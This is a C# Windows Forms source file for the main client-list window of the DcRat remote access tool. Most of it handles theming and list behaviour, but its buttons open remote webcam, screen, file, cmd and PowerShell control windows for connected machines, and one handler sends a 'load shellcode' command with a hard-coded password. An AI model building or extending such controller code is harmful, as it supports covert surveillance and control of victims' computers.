using DcRat.Controls;
using DcRat.Properties;
using DcRat.SingleForms;
using DcRat.TCPSocket;
using MessagePack;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DcRat.ChildForms
{
    public partial class childFormHome : Form
    {

        private ListViewColumnSorter lvwColumnSorter;

        public childFormHome()
        {
            InitializeComponent();
        }

        private bool previoustheme = false;
        private void updateUI_Tick(object sender, EventArgs e)
        {
            if (previoustheme != Settings.Default.darkTheme)
            {
                previoustheme = Settings.Default.darkTheme;
                SetTheme();
            }
        }
        private void SetTheme()
        {
            bool darkTheme = Settings.Default.darkTheme;

            Color colorSide = darkTheme ? Settings.Default.colorsidedark : Settings.Default.colorside;
            Color colorText = darkTheme ? Settings.Default.colortextdark : Settings.Default.colortext;

            this.BackColor = colorSide;
            this.ForeColor = colorText;

            toolStripMain.BackColor = colorSide;
            toolStripMain.ForeColor = colorText;
            toolStripButtoncamera.Image = darkTheme ? Resources.webcam : Resources.webcam_dark;
            toolStripButtoncmd.Image = darkTheme ? Resources.cmd : Resources.cmd_dark;
            toolStripButtondetails.Image = darkTheme ? Resources.ico_detail : Resources.ico_detail_dark;
            toolStripButtondevice.Image = darkTheme ? Resources.devices : Resources.devices_dark;
            toolStripButtonfile.Image = darkTheme ? Resources.file : Resources.file_dark;
            toolStripButtonicon.Image = darkTheme ? Resources.ico_picture : Resources.ico_picture_dark;
            toolStripButtonnetwork.Image = darkTheme ? Resources.network : Resources.network_dark;
            toolStripButtonpowershell.Image = darkTheme ? Resources.powershell : Resources.powershell_dark;
            toolStripButtonprocess.Image = darkTheme ? Resources.process : Resources.process_dark;
            toolStripButtonscreen.Image = darkTheme ? Resources.screen : Resources.screen_dark;
            listViewHome.BackColor = darkTheme ? Settings.Default.colorlistviewdark : Settings.Default.colorlistview; 
            listViewHome.ForeColor = darkTheme ? Settings.Default.colorlistviewtextdark : Settings.Default.colorlistviewtext;
            foreach (ListViewItem item in listViewHome.Items)
            {
                if (listViewHome.Tag!= item)
                {
                    item.ForeColor = Settings.Default.darkTheme ? Settings.Default.colorlistviewtextdark : Settings.Default.colorlistviewtext;
                    item.BackColor = Settings.Default.darkTheme ? Settings.Default.colorlistviewdark : Settings.Default.colorlistview;
                }                
            }
        }

        private void toolStripButtonfile_Click(object sender, EventArgs e)
        {
            singleFormFile formFile = new singleFormFile();
            formFile.Show();
        }

        private void toolStripButtonscreen_Click(object sender, EventArgs e)
        {
            singleFormScreen formScreen = new singleFormScreen();
            formScreen.Show();
        }

        private void toolStripButtoncamera_Click(object sender, EventArgs e)
        {
            singleFormCamera formCamera = new singleFormCamera();
            formCamera.Show();
        }

        private void toolStripButtoncmd_Click(object sender, EventArgs e)
        {
            singleFormCmd formCmd = new singleFormCmd();
            formCmd.Show();
        }

        private void toolStripButtonpowershell_Click(object sender, EventArgs e)
        {
            singleFormPowershell formPowershell = new singleFormPowershell();
            formPowershell.Show();
        }

        private void toolStripButtonprocess_Click(object sender, EventArgs e)
        {
            singleFormProcess formProcess = new singleFormProcess();
            formProcess.Show();
        }
        ListViewItem lvHoveredItem;
        private void listViewHome_MouseMove(object sender, MouseEventArgs e)
        {
            Color oItemColor = Settings.Default.darkTheme ? ColorTranslator.FromHtml("#2D333B") : Color.Lavender;
            Color oOriginalColor = Settings.Default.darkTheme ? Settings.Default.colorlistviewdark : Settings.Default.colorlistview;

            ListViewItem lvCurrentItem = listViewHome.GetItemAt(e.X, e.Y);


            if ((lvCurrentItem != null) && (lvCurrentItem != lvHoveredItem))
            {
                if (lvCurrentItem != listViewHome.Tag)
                {
                    lvCurrentItem.BackColor = oItemColor;

                    if ((lvHoveredItem != null) && (lvHoveredItem != listViewHome.Tag))
                    {
                        lvHoveredItem.BackColor = oOriginalColor;
                    }

                    lvHoveredItem = lvCurrentItem;
                    return;
                }
                else
                {
                    if ((lvHoveredItem != null) && (lvHoveredItem != listViewHome.Tag))
                    {
                        lvHoveredItem.BackColor = oOriginalColor;
                    }

                    lvHoveredItem = lvCurrentItem;
                    return;
                }
            }


            if (lvCurrentItem == null)
            {
                if ((lvHoveredItem != null) && (lvHoveredItem != listViewHome.Tag))
                {
                    lvHoveredItem.BackColor = oOriginalColor;
                    lvHoveredItem = null;
                }

            }
        }

        private void toolStripButtondetails_Click(object sender, EventArgs e)
        {
            toolStripButtonicon.Enabled = true;
            toolStripButtondetails.Enabled = false;
            listViewHome.View = View.Details;
        }

        private void toolStripButtonicon_Click(object sender, EventArgs e)
        {
            toolStripButtonicon.Enabled = false;
            toolStripButtondetails.Enabled = true;
            listViewHome.View = View.LargeIcon;
            if (listViewHome.Items.Count == 0) return;
            foreach (ListViewItem itm in listViewHome.Items)
            {
                itm.ImageIndex = 0;
            }
        }

        private void listViewHome_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (listViewHome.SelectedItems.Count > 0)
            {
                foreach (ListViewItem item in listViewHome.Items)
                {
                    item.ForeColor = Settings.Default.darkTheme ? Settings.Default.colorlistviewtextdark : Settings.Default.colorlistviewtext;
                    item.BackColor = Settings.Default.darkTheme ? Settings.Default.colorlistviewdark : Settings.Default.colorlistview;
                }
                foreach (ListViewItem item in listViewHome.SelectedItems)
                {
                    //item.ForeColor = Settings.Default.darkTheme ? Settings.Default.colorlistviewdark : Settings.Default.colorlistview;
                    item.ForeColor = Color.White;
                    item.BackColor = Settings.Default.darkTheme ? ColorTranslator.FromHtml("#5D4529") : ColorTranslator.FromHtml("#758B98");
                }
                listViewHome.Tag = listViewHome.FocusedItem;
                listViewHome.FocusedItem.Selected = false;
            }
        }

        private void listViewHome_MouseLeave(object sender, EventArgs e)
        {
            if ((lvHoveredItem != null) && (lvHoveredItem != listViewHome.Tag))
            {
                lvHoveredItem.BackColor = Settings.Default.darkTheme ? Settings.Default.colorlistviewdark : Settings.Default.colorlistview;
            }
            lvHoveredItem = null;
        }

        private void listViewHome_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                return;
            }
            if (listViewHome.SelectedIndices.Count == 0)
            {
                foreach (ListViewItem item in listViewHome.Items)
                {
                    item.ForeColor = Settings.Default.darkTheme ? Settings.Default.colorlistviewtextdark : Settings.Default.colorlistviewtext;
                    item.BackColor = Settings.Default.darkTheme ? Settings.Default.colorlistviewdark : Settings.Default.colorlistview;
                }
                listViewHome.Tag = null;
            }
        }

        private void loadShellcodeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listViewHome.Tag != null)
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("Packet").AsString = "Command";
                msgpack.ForcePathObject("HWID").AsString = Connection.HWID();
                msgpack.ForcePathObject("Password").AsString = "qwqdanchun";

                msgpack.ForcePathObject("Client").AsString = ((ListViewItem)listViewHome.Tag).SubItems[3].Text;                
                Connection.Send(msgpack.Encode2Bytes());
            }
        }

        private void listViewHome_DrawItem(object sender, DrawListViewItemEventArgs e)
        {
            e.DrawDefault = true;
        }

        private void toolStripButtonnetwork_Click(object sender, EventArgs e)
        {
            singleFormNetwork formNetwork = new singleFormNetwork();
            formNetwork.Show();
        }

        private void toolStripButtondevice_Click(object sender, EventArgs e)
        {
            singleFormDevice formDevice = new singleFormDevice();
            formDevice.Show();
        }

        private void childFormHome_Load(object sender, EventArgs e)
        {
            Optimization.EnableListviewDoubleBuffer(listViewHome);
            lvwColumnSorter = new ListViewColumnSorter();
            this.listViewHome.ListViewItemSorter = lvwColumnSorter;
        }

        private void listViewHome_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            if (e.Column == lvwColumnSorter.SortColumn)
            {
                if (lvwColumnSorter.Order == SortOrder.Ascending)
                {
                    lvwColumnSorter.Order = SortOrder.Descending;
                }
                else
                {
                    lvwColumnSorter.Order = SortOrder.Ascending;
                }
            }
            else
            {
                lvwColumnSorter.SortColumn = e.Column;
                lvwColumnSorter.Order = SortOrder.Ascending;
            }
            try
            {
                this.listViewHome.Sort();
            }
            catch{}
            
        }

        private void listViewHome_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
        {
            int tColumnCount;
            Rectangle tRect = new Rectangle();
            Point tPoint = new Point();
            Font tFont = new Font("Segoe UI", 9, FontStyle.Regular);
            SolidBrush tBackBrush = new SolidBrush(Settings.Default.darkTheme ? Settings.Default.colorlistviewdark : Settings.Default.colorlistview);
            SolidBrush tFtontBrush;
            tFtontBrush = new SolidBrush(Settings.Default.darkTheme ? Settings.Default.colortextdark : Settings.Default.colortext);
            if (listViewHome.Columns.Count == 0)
                return;
            tColumnCount = listViewHome.Columns.Count;
            tRect.Y = 0;
            tRect.Height = e.Bounds.Height - 1;
            tPoint.Y = 3;
            for (int i = 0; i < tColumnCount; i++)
            {
                if (i == 0)
                {
                    tRect.X = 0;
                    tRect.Width = listViewHome.Columns[i].Width;
                }
                else
                {
                    tRect.X += tRect.Width;
                    tRect.X += 1;
                    tRect.Width = listViewHome.Columns[i].Width - 1;
                }
                e.Graphics.FillRectangle(tBackBrush, tRect);
                tPoint.X = tRect.X + 3;
                e.Graphics.DrawString(listViewHome.Columns[i].Text, tFont, tFtontBrush, tPoint);
            }
        }
    }
}
